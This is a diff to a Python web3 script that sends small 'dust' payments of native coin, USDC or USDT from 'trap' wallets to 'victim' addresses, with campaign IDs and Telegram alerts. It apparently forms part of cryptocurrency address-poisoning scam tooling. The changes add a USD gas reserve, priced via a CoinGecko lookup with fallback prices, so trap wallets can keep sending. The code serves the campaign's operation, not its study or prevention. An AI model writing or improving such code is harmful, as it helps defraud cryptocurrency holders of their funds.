@@ -4,6 +4,8 @@ import os
 import re
 import time
 import argparse
+import json
+import urllib.request
 from datetime import datetime, timezone
 from web3 import Web3
 from dotenv import load_dotenv
@@ -11,6 +13,10 @@ from web3.exceptions import TimeExhausted
 
 # --- Ensure we don't let .env overwrite OS-level PM2 variables ---
 load_dotenv(override=False)
+
+# --- Gas Reserve Configuration ---
+# Amount in USD to keep as a reserve in the trap wallet for future gas fees
+GAS_RESERVE_USD = float(os.getenv("GAS_RESERVE_USD", "0.20"))
 
 # --- Official POA middleware import ---
 try:
@@ -286,6 +292,7 @@ def get_token_balance(address, token_symbol):
     except Exception as e:
         logger.warning(f"Failed to get token balance for {address}: {e}")
         return 0
+    
 
 def choose_asset(victim, trap, preferred_asset=None):
     victim_usdc = get_token_balance(victim, "USDC")
@@ -306,14 +313,24 @@ def choose_asset(victim, trap, preferred_asset=None):
     usdc_dust = DUST_AMOUNT.get("USDC", 0)
     usdt_decimals = 6
     usdt_dust = DUST_AMOUNT.get("USDT", 0)
+    native_dust = DUST_AMOUNT.get(NATIVE_SYMBOL, 0)
 
-    # Check viability
+    # Check stablecoin viability
     usdc_ok = trap_usdc >= usdc_dust and (victim_usdc > 0 or force_stable)
     usdt_ok = trap_usdt >= usdt_dust and (victim_usdt > 0 or force_stable)
 
     pref_upper = preferred_asset.upper() if preferred_asset else None
-    native_dust = DUST_AMOUNT.get(NATIVE_SYMBOL, 0)
-    native_ok = trap_native_bal >= native_dust
+    
+    # 🚨 CRITICAL FIX: Calculate if native balance can ACTUALLY cover dust + gas + reserve
+    reserve_wei = get_native_reserve_wei(CHAIN)
+    try:
+        current_gas_price = w3.eth.gas_price
+    except Exception:
+        current_gas_price = w3.to_wei(1, "gwei")
+    
+    # Use a conservative 68,000 gas limit to ensure we have enough for any tx type + reserve
+    safe_native_threshold = native_dust + reserve_wei + (68000 * current_gas_price)
+    native_ok = trap_native_bal >= safe_native_threshold
 
     # 1. Try preferred asset first
     if pref_upper == NATIVE_SYMBOL and native_ok:
@@ -326,7 +343,7 @@ def choose_asset(victim, trap, preferred_asset=None):
     # 2. Build explicit fallback notification message if preferred asset was unavailable
     fallback_reason = None
     if pref_upper == NATIVE_SYMBOL and not native_ok:
-        fallback_reason = f"preferred native asset {NATIVE_SYMBOL} balance ({fmt(trap_native_bal, 18)}) is below dust threshold ({fmt(native_dust, 18)})"
+        fallback_reason = f"preferred native asset {NATIVE_SYMBOL} balance is insufficient to cover dust, gas, and the ${GAS_RESERVE_USD} reserve"
     elif pref_upper == "USDC" and not usdc_ok:
         fallback_reason = f"preferred USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below dust threshold ({fmt(usdc_dust, usdc_decimals)})"
     elif pref_upper == "USDT" and not usdt_ok:
@@ -350,7 +367,7 @@ def choose_asset(victim, trap, preferred_asset=None):
     # 6. Detailed failure reporting if no assets are available
     reasons = []
     if not native_ok:
-        reasons.append(f"Trap {NATIVE_SYMBOL} balance ({fmt(trap_native_bal, 18)}) is below threshold ({fmt(native_dust, 18)}).")
+        reasons.append(f"Trap {NATIVE_SYMBOL} balance ({fmt(trap_native_bal, 18)}) is too low to cover dust, gas, and the ${GAS_RESERVE_USD} reserve.")
     if trap_usdc < usdc_dust:
         reasons.append(f"Trap USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below threshold ({fmt(usdc_dust, usdc_decimals)}).")
     elif victim_usdc == 0 and not force_stable:
@@ -366,6 +383,36 @@ def choose_asset(victim, trap, preferred_asset=None):
 
 _last_low_balance_alert = {}
 _local_nonces = {}
+
+def get_native_reserve_wei(chain_name):
+    """Calculates the Wei equivalent of the GAS_RESERVE_USD for the native coin."""
+    try:
+        # CoinGecko IDs for the 3 supported chains
+        symbol_map = {"ethereum": "ethereum", "bsc": "binancecoin", "polygon": "matic-network"}
+        coin_id = symbol_map.get(chain_name.lower(), "ethereum")
+        
+        url = f"https://api.coingecko.com/api/v3/simple/price?ids={coin_id}&vs_currencies=usd"
+        req = urllib.request.Request(url, headers={'User-Agent': 'CipherNet/1.0'})
+        with urllib.request.urlopen(req, timeout=3) as response:
+            data = json.loads(response.read().decode())
+            price = data[coin_id]['usd']
+            
+            # Calculate exact Wei needed for the USD reserve (all 3 chains use 18 decimals)
+            reserve_native = GAS_RESERVE_USD / price
+            return int(reserve_native * (10 ** 18))
+            
+    except Exception:
+        # Safe fallback reserves using conservative worst-case prices 
+        # to ensure the trap ALWAYS keeps at least the GAS_RESERVE_USD value
+        worst_case_prices = {
+            "ethereum": 4000,   # Assumes ETH <= $4000
+            "bsc": 700,         # Assumes BNB <= $700
+            "polygon": 1.0      # Assumes MATIC <= $1.00
+        }
+        price = worst_case_prices.get(chain_name.lower(), 4000)
+        return int((GAS_RESERVE_USD / price) * (10 ** 18))
+
+# ─── Modified send_dust to support detailed messaging ───
 
 # ─── Modified send_dust to support detailed messaging ───
 def send_dust(private_key, victim_address, campaign_id=None):
@@ -448,6 +495,9 @@ def send_dust(private_key, victim_address, campaign_id=None):
 
         # ─── BUILD TRANSACTION (Supports BOTH Native and ERC-20) ───
         if asset == NATIVE_SYMBOL:
+            # Calculate dynamic $X.XX USD reserve in Wei to ensure trap always has gas money left
+            reserve_wei = get_native_reserve_wei(CHAIN)
+            
             # Native transfer logic
             tx_payload = {
                 "from": trap,
@@ -459,7 +509,7 @@ def send_dust(private_key, victim_address, campaign_id=None):
                 **gas_params
             }
             tx = tx_payload
-            required_eth = (21000 * effective_gas_price) + dust
+            required_eth = (21000 * effective_gas_price) + dust + reserve_wei
         else:
             # ERC-20 transfer logic
             token_addr = TOKEN_CONFIG.get(asset)
@@ -512,7 +562,7 @@ def send_dust(private_key, victim_address, campaign_id=None):
                 logger.warning(alert_msg)
 
         if native_balance < required_eth:
-            msg = f"⚠️ Insufficient {NATIVE_SYMBOL} for gas in trap {trap}. Need {w3.from_wei(required_eth, 'ether')}, have {w3.from_wei(native_balance, 'ether')}."
+            msg = f"⚠️ Insufficient {NATIVE_SYMBOL} in trap {trap}. Need {w3.from_wei(required_eth, 'ether')} (includes dust, gas, and ${GAS_RESERVE_USD} reserve), have {w3.from_wei(native_balance, 'ether')}."
             logger.error(msg)
             send_telegram(msg, campaign_id=campaign_id)
             return False
